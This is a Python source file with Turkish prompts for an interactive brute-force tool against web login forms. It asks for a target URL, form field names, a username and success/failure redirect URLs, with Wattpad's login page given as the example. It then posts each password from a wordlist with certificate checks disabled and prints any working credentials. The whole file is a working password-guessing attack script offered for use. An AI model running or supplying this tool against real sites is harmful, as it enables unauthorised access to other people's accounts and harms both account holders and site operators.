from utils.functions import clear
from colorama import Fore, Back ,Style
import requests
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run_brute_force():
    clear()

    print(Fore.YELLOW, "Brute Force saldırısına hoşgeldiniz. Saldırıda kullanılacak olası şifre kombinasyonunu değiştirmek istiyorsanız proje dizininde utils/wordlist/passwords.txt yerine kendi dosyanızın adını passwords.txt olarak aynı düzenle saklayabilirsiniz", Style.RESET_ALL)

    print(Fore.CYAN, "\nHedef URL'yi girin:", Style.RESET_ALL)
    url = str(input())

    clear()
    print(Fore.CYAN, "Saldırılacak formun kullanıcı adı kısmının name değişkenini girin:", Style.RESET_ALL)
    username_field = str(input())

    clear()
    print(Fore.CYAN, "Saldırılacak formun parola kısmının name değişkenini girin:", Style.RESET_ALL)
    password_field = str(input())

    clear()
    print(Fore.CYAN, "Hedef kullanıcı adını girin:", Style.RESET_ALL)
    username = str(input())

    clear()
    print(Fore.CYAN, "Başarılı girişte dönüş URL'sini girin (örneğin: https://www.wattpad.com/home):", Style.RESET_ALL)
    success_url = str(input())

    clear()
    print(Fore.CYAN, "Başarısız girişte dönüş URL'sini girin (örneğin: https://www.wattpad.com/login):", Style.RESET_ALL)
    failure_url = str(input())

    clear()

    password_file = os.path.join("utils", "wordlists", "passwords.txt")

    try:
        with open(password_file, 'r') as file:
            password_list = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "Parola dosyası bulunamadı." + Style.RESET_ALL)
        return

    http_brute_force(url, username_field, password_field, username, password_list, success_url, failure_url)

def http_brute_force(target_url, username_field, password_field, username, password_list, success_url, failure_url):
    for password in password_list:
        data = {
            username_field: username,
            password_field: password
        }
        try:
            response = requests.post(target_url, data=data, verify=False)
            current_url = response.url

            if current_url == success_url:
                print(Fore.GREEN + f"[+] Başarılı giriş: {username}:{password}" + Style.RESET_ALL)
                return True
            elif current_url == failure_url:
                print(Fore.RED + f"[-] Başarısız giriş: {username}:{password}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"[?] Beklenmeyen durum: {username}:{password}" + Style.RESET_ALL)
        
        except requests.RequestException as e:
            print(Fore.RED + f"[!] İstek sırasında hata oluştu: {e}" + Style.RESET_ALL)

    print(Fore.RED + "[!] Giriş yapılamadı" + Style.RESET_ALL)
    return False